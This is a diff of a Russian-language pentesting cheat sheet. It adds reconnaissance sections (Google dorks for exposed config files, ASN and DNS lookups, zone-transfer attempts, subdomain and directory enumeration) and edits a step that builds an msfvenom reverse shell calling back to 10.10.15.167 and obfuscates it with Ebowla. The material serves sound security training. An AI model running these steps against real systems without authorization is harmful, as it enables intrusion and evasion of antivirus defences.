@@ -654,11 +654,11 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 
 ```
 root@kali:$ git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
-root@kali:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
+root@kali:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o /tmp/rev.exe
 root@kali:$ pip install configobj
 root@kali:$ vi genetic.config
 ...Edit output_type, payload_type, ENV_VAR...
-root@kali:$ python ebowla.py rev.exe genetic.config
+root@kali:$ python ebowla.py /tmp/rev.exe genetic.config && rm /tmp/rev.exe
 root@kali:$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe
 [+] output/ebowla-rev.exe
 ```
@@ -1074,9 +1074,58 @@ root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
 
 ## Information Gathering
 
+* [pentest-tools.com/home](https://pentest-tools.com/home)
+* [hackertarget.com/ip-tools/](https://hackertarget.com/ip-tools/)
+
+
+
+### Google Dorks
+
+```
+site:example.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
+site:example.com ext:(config | cfg | ini | log | bak | backup | dat)
+site:example.com ext:(php | asp | aspx)
+```
+
+
+
+### Autonomous Systems
+
+* [hackware.ru/?p=9245](https://hackware.ru/?p=9245)
+
+
+#### via IP
+
+dig:
+
+```
+root@kali:$ dig $(dig -x 127.0.0.1 | grep PTR | tail -n 1 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').origin.asn.cymru.com TXT +short
+```
+
+whois:
+
+```
+root@kali:$ whois -h whois.cymru.com -- '-v 127.0.0.1'
+root@kali:$ whois -h whois.radb.net 127.0.0.1
+```
+
+
+#### via ASN
+
+whois:
+
+```
+root@kali:$ whois -h whois.cymru.com -- '-v AS48666'
+root@kali:$ whois -h whois.radb.net AS48666
+```
+
 
 
 ### DNS
+
+* [dnsdumpster.com/](https://dnsdumpster.com/)
+* [www.nmmapper.com/sys/tools/subdomainfinder/](https://www.nmmapper.com/sys/tools/subdomainfinder/)
+* [securitytrails.com/blog/subdomain-scanner-find-subdomains](https://securitytrails.com/blog/subdomain-scanner-find-subdomains)
 
 
 #### whois
@@ -1093,7 +1142,7 @@ root@kali:$ whois [-h whois.example.com] example.com или 127.0.0.1
 General:
 
 ```
-root@kali:$ dig [@dns.example.com] example.com [{a,mx,ns,soa,txt,...}]
+root@kali:$ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
 root@kali:$ dig -x example.com [+short] [+timeout=1]
 ```
 
@@ -1109,7 +1158,7 @@ root@kali:$ dig axfr @dns.example.com example.com
 #### nslookup
 
 ```
-root@kali:$ nslookup example.com или 127.0.0.1
+root@kali:$ nslookup example.com (или 127.0.0.1 для PTR)
 
 root@kali:$ nslookup
 [> server dns.example.com]
@@ -1893,17 +1942,58 @@ root@kali:$ cp t passwords.txt
 
 
 
-## Examples
+
+# Methodology
 
 
 
-### Web
+
+## OSINT
+
+
+
+### Domain
+
+```
+* DNS
+	$ nslookup example.com
+	+ AXFR
+		$ dig example.com ns
+		$ dig axfr @ns.example.com example.com
+		$ ./axfr-test.py -d example.com
+	+ AS details
+		$ whois -h whois.cymru.com -- '-v 127.0.0.1'
+		$ whois -h whois.cymru.com -- '-v AS48666'
+	$ whois example.com
+	$ whois 127.0.0.1
+	+ Subdomains
+		$ ./amass -d example.com
+		$ ./subbrute.py example.com
+		$ ./knockpy example.com
+		$ ./dnsrecon.py -d example.com
+* CMS, Stack, Vulns
+	$ whatweb 127.0.0.1
+	+ Shodan/Censys/SecurityTrails
+* Google Dorks
+	+ /robots.txt
+	+ /sitemap.xml
+```
+
+
+
+
+## Web Application
 
 ```
 * Check src
 root@kali:$ whatweb http://127.0.0.1
 root@kali:$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,txt,bak,json,html -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 ```
+
+
+
+
+## Internal
 
 
 
